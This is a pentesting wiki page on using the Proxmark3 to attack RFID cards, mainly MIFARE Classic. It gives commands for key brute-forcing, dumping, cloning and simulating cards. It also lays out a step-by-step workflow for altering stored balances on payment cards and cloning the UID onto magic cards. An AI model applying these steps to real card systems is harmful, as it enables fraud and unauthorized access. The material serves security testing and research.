# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Attacking RFID Systems with Proxmark3

Install the actively maintained RRG/Iceman Proxmark3 client and matching firmware, then confirm command syntax with that build because older commands shown below may have changed.<sup>[[1]](#references)[[5]](#references)</sup>

### Attacking MIFARE Classic 1KB

MIFARE Classic 1K has **16 sectors**, each with **4 blocks** of **16 bytes**. Manufacturer block 0 contains the UID/manufacturer data and is read-only on genuine NXP cards; special clone or “magic” cards may permit rewriting it.<sup>[[1]](#references)[[2]](#references)</sup>\
To access each sector you need **2 keys** (**A** and **B**) which are stored in **block 3 of each sector** (sector trailer). The sector trailer also stores the **access bits** that give the **read and write** permissions on **each block** using the 2 keys.\
2 keys are useful to give permissions to read if you know the first one and write if you know the second one (for example).

Several attacks can be performed

```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```

The Proxmark3 allows to perform other actions like **eavesdropping** a **Tag to Reader communication** to try to find sensitive data. In this card you could just sniff the communication with and calculate the used key because the **cryptographic operations used are weak** and knowing the plain and cipher text you can calculate it (`mfkey64` tool).<sup>[[3]](#references)</sup>

#### MiFare Classic quick workflow for stored-value abuse

When terminals store balances on Classic cards, a typical end-to-end flow is:<sup>[[4]](#references)</sup>

```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```

Notes

- `hf mf autopwn` orchestrates nested/darkside/HardNested-style attacks, recovers keys, and creates dumps in the client dumps folder.<sup>[[1]](#references)</sup>
- Writing block 0/UID only works on magic gen1a/gen2 cards. Normal Classic cards have read-only UID.<sup>[[2]](#references)</sup>
- Many deployments use Classic "value blocks" or simple checksums. Ensure all duplicated/complemented fields and checksums are consistent after editing.<sup>[[4]](#references)</sup>

See a higher-level methodology and mitigations in:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Raw Commands

IoT systems sometimes use **nonbranded or noncommercial tags**. In this case, you can use Proxmark3 to send custom **raw commands to the tags**.

```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
  proprietary non iso14443-4 card found, RATS not supported
  No chinese magic backdoor command detected
  Prng detection: WEAK
  Valid ISO14443A Tag Found - Quitting Search
```

With this information you could try to search information about the card and about the way to communicate with it. Proxmark3 allows to send raw commands like: `hf 14a raw -p -b 7 26`

### Scripts

The Proxmark3 software comes with a preloaded list of **automation scripts** that you can use to perform simple tasks. To retrieve the full list, use the `script list` command. Next, use the `script run` command, followed by the script’s name:

```
proxmark3> script run mfkeys
```

You can create a script to **fuzz tag readers**, so copying the data of a **valid card** just write a **Lua script** that **randomize** one or more random **bytes** and check if the **reader crashes** with any iteration.

## References

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [RRG/Iceman Proxmark3 — Linux installation](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)

{{#include ../../banners/hacktricks-training.md}}
